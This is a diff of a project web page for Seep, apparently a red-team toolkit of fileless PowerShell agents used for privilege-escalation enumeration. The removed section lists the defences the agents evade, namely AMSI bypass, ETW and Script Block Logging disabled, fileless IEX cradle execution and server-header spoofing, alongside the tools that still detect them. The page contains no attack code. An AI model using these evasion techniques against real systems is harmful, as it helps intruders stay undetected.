-                <div class="detect-card detect-hidden animate" style="transition-delay:.1s">
-                    <h3>Evades</h3>
-                    <ul>
-                        <li>AMSI — bypass in cradle before agent loads</li>
-                        <li>ETW — disabled at runtime, Script Block Logging off</li>
-                        <li>Disk forensics — fileless execution via IEX cradle</li>
-                        <li>IIS fingerprinting — server header spoofing</li>
-                        <li>Auth probing — token-gated endpoints return 404</li>
-                    </ul>
-                </div>
-                <div class="detect-card detect-visible animate" style="transition-delay:.2s">
-                    <h3>Visible To</h3>
-                    <ul>
-                        <li>Advanced EDR — behavioral and kernel-level detection</li>
-                        <li>Memory scanning — PowerShell in-memory artifacts</li>
-                        <li>Network monitoring — HTTP connection metadata</li>
-                        <li>PowerShell v5+ — deep script inspection</li>
-                        <li>Defender ATP — cloud-connected analysis</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
+    <!-- Call to Action -->
+    <section class="cta">
+        <h2>Start Enumerating</h2>
+        <p>Deploy fileless agents and discover privilege escalation paths</p>
+        <a href="https://github.com/Real-Fruit-Snacks/Seep" class="cta-button">
+            <span>→</span>
+            Get Seep
+        </a>
     </section>
 
     <!-- Footer -->
-    <footer>
-        <div class="container">
-            <div class="footer-line"></div>
-            <div class="footer-grid">
-                <div><h4>Documentation</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Seep#quick-start">Quick Start</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Seep#features">Features</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Seep#architecture">Architecture</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Seep#security">Security</a></li></ul></div>
-                <div><h4>Resources</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Seep/releases/latest">Latest Release</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Seep/issues">Report Issue</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/CONTRIBUTING.md">Contributing</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/CHANGELOG.md">Changelog</a></li></ul></div>
-                <div><h4>Toolkit</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Rapids">Rapids</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Whirlpool">Whirlpool</a></li><li><a href="https://github.com/Real-Fruit-Snacks">View All →</a></li></ul></div>
-                <div><h4>License</h4><p>MIT License<br>Copyright © 2026<br>Real-Fruit-Snacks</p></div>
-            </div>
-            <div class="footer-bottom">Part of the Real-Fruit-Snacks security toolkit</div>
-        </div>
+    <footer class="footer">
+        <p>
+            <strong>Real-Fruit-Snacks</strong> —
+            <a href="https://real-fruit-snacks.github.io/">All projects</a> ·
+            <a href="https://github.com/Real-Fruit-Snacks/Seep/security/advisories">Security</a> ·
+            <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/LICENSE">License</a>
+        </p>
     </footer>
-
-    <script>
-    // Scroll animations
-    const obs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){el.target.classList.add('visible');obs.unobserve(el.target)}})},{threshold:.1,rootMargin:'0px 0px -50px 0px'});
-    document.querySelectorAll('.animate,.animate-scale').forEach(el=>obs.observe(el));
-
-    // Counter animation
-    function countUp(el){const t=parseInt(el.dataset.target),s=el.dataset.suffix||'',p=el.dataset.prefix||'',d=1500,st=performance.now();function u(n){const pr=Math.min((n-st)/d,1),e=1-Math.pow(1-pr,3);el.textContent=p+Math.floor(t*e)+s;if(pr<1)requestAnimationFrame(u)}requestAnimationFrame(u)}
-    const sobs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){countUp(el.target);sobs.unobserve(el.target)}})},{threshold:.5});
-    document.querySelectorAll('.stat-num').forEach(el=>sobs.observe(el));
-
-    // Nav scroll
-    window.addEventListener('scroll',()=>{document.querySelector('.nav').style.borderBottomColor=window.scrollY>20?'rgba(49,50,68,0.8)':'rgba(49,50,68,0.3)'});
-    </script>
 </body>
 </html>
